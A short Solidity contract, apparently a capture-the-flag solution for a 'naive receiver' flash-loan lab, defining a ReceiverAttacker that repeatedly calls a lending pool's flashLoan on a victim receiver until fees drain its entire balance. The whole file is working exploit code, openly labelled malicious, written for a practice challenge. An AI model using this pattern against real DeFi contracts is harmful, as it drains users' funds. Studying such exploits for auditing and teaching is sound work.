// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

// Malicious contract to drain the funds for FlashLoanReceiver

contract ReceiverAttacker {
    NaiveReceiverLenderPool private pool;
    address payable private weakBorrower;

    constructor(address payable _pool, address payable _weakReceiverAddress) {
        pool = NaiveReceiverLenderPool(_pool);
        weakBorrower = _weakReceiverAddress;
    }

    function attack() public payable {
        while (weakBorrower.balance > 0) {
            pool.flashLoan(weakBorrower, 1 ether);
        }
    }
}
